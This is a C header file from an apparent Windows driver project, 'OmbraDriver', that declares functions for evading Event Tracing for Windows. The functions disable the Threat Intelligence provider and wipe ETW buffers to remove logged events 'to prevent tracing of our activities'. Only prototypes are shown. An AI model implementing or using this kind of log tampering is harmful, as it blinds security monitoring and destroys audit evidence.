// etw.h - ETW (Event Tracing for Windows) Control
// OmbraDriver Phase 3
//
// Controls ETW to prevent tracing of our activities

#ifndef OMBRA_ETW_H
#define OMBRA_ETW_H

#include "../shared/types.h"

// Initialize ETW control system
void EtwInit(void);

// Disable Threat Intelligence ETW provider
I32 EtwDisableTiProvider(void);

// Wipe an ETW buffer to remove logged events
I32 EtwWipeBuffer(U64 bufferAddress);

// Restore ETW to original state
I32 EtwRestore(void);

// Get ETW statistics
void EtwGetStats(bool* tiDisabled, U64* wipeCount);

// Command handlers
I32 HandleEtwDisableTi(POMBRA_COMMAND cmd, POMBRA_RESPONSE resp);
I32 HandleEtwWipeBuffer(POMBRA_COMMAND cmd, POMBRA_RESPONSE resp);
I32 HandleEtwRestore(POMBRA_COMMAND cmd, POMBRA_RESPONSE resp);

#endif // OMBRA_ETW_H
